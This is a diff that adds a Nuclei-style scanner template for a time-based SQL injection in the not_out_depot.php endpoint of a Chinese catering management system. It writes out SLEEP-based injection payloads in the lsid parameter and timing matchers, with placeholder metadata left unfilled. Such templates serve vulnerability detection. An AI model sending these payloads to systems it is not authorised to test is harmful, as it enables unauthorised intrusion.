@@ -1,0 +1,24 @@
+id: ysyszhcy-depot-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 喰星云·数字化餐饮服务系统not_out_depot存在SQL注入漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/logistics/home_warning/php/not_out_depot.php?do=getList&lsid=(CASE WHEN (2945=2945) THEN SLEEP(3) ELSE 2945 END)"
+      - "{{BaseURL}}/logistics/home_warning/php/not_out_depot.php?do=getList&lsid=(CASE WHEN (2945=2945) THEN SLEEP(6) ELSE 2945 END)"
+      - "{{BaseURL}}/logistics/home_warning/php/not_out_depot.php?do=getList&lsid=(CASE WHEN (2945=2945) THEN SLEEP(9) ELSE 2945 END)"
+
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
